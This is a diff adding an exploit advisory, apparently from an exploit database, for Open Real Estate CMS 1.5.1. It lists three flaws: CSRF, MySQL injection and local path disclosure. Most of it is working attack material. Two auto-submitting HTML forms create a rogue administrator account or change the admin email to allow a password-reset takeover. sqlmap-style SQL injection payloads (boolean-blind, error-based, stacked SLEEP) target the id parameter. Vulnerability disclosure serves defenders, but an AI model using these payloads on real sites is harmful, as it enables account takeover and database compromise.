@@ -1,0 +1,88 @@
+###################################################################################################################################
+# Exploit Title: Open Real Estate CMS - Multiple vilnerabilities
+# Date: 2013 9 August
+# Exploit Author: Yashar shahinzadeh
+# Special thanks to Mormoroth
+# Credit goes for: http://y-shahinzadeh.ir & ha.cker.ir
+# Vendor Homepage: http://monoray.net/products/6-open-real-estate
+# Tested on: Linux & Windows, PHP 5.3.4
+# Affected Version : 1.5.1
+#
+# Contacts: { http://Twitter.com/YShahinzadeh , http://y-shahinzadeh.ir , http://Twitter.com/Mormoroth , http://mormoroth.ir }
+###################################################################################################################################
+
+Summary:
+========
+1. CSRF - Adding/Editing administrator account
+2. MySQL Injection
+3. Local path disclosure
+
+1. CSRF - Adding/Editing administrator account:
+===============================================
+Following exploits can be used against any site installed "Open Real Estate" CMS. 
+
+<html>
+	<body onload="submitForm()">
+	<form name="myForm" id="myForm"
+	action="http://localhost/OpenRealEstateV1.5.1_en/users/backend/main/create" method="post">
+	<input type="hidden" name="User[username]" value="yashar">
+	<input type="hidden" name="User[email]" value="y.shahinzadeh@gmail.com">
+	<input type="hidden" name="User[phone]" value="09169189680">
+	<input type="hidden" name="User[additional_info_en]" value="">
+	<input type="hidden" name="User[password]" value="6658912">
+	<input type="hidden" name="User[password_repeat]" value="6658912">
+	<input type="hidden" name="yt0" value="">
+	</form>
+	<script type='text/javascript'>document.myForm.submit();</script>
+</html>
+
+Once the exploit is excuted, an email will send to attacker's email containing activation link. Additionally, for modifying, the administrator's ID is 1, so attack may change the administrator's email address, then he/she may use forget password option and go through administrator panel.
+
+<html>
+	<body onload="submitForm()">
+	<form name="myForm" id="myForm"
+	action="http://localhost/OpenRealEstateV1.5.1_en/users/backend/main/update?id=1" method="post">
+	<input type="hidden" name="User[username]" value="admin">
+	<input type="hidden" name="User[email]" value="y.shahinzadeh@gmail.com">
+	<input type="hidden" name="User[phone]" value="09169189680">
+	<input type="hidden" name="User[additional_info_en]" value="">
+	<input type="hidden" name="yt0" value="">
+	</form>
+	<script type='text/javascript'>document.myForm.submit();</script>
+</html>
+
+
+
+2. MySQL Injection:
+===================
+An attacker may conduct an attack by using MySQL injection after authentication so as to get higher access like uploading a shell script or etc... I just show the injection point and a small example of devastiating usage of it:
+
+http://localhost/OpenRealEstateV1.5.1_en/apartments/backend/main/view=[Injection payload]
+
+POC: 
+---
+Place: GET
+Parameter: id
+    Type: boolean-based blind
+    Title: MySQL boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (RLIKE)
+    Payload: id=" RLIKE IF(7309=7309,0x4d7953514c,0x28) AND "ymsG"="ymsG
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: id=" AND (SELECT 1454 FROM(SELECT COUNT(*),CONCAT(0x3a6b62653a,(SELECT (CASE WHEN (1454=1454) THEN 1 ELSE 0 END)),0x3a6c66753a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND "KASA"="KASA
+
+    Type: stacked queries
+    Title: MySQL > 5.0.11 stacked queries
+    Payload: id="; SELECT SLEEP(5)-- 
+---
+
+
+
+3. Local path disclosure:
+=========================
+There are some pages that are big leads to knowing local path, the path is valuable and can be used in Injection and... I would give an instance only:
+
+http://localhost/OpenRealEstateV1.5.1_en/apartments/backend/main/view
+
+
+/** Yasshar shahinzadeh **/
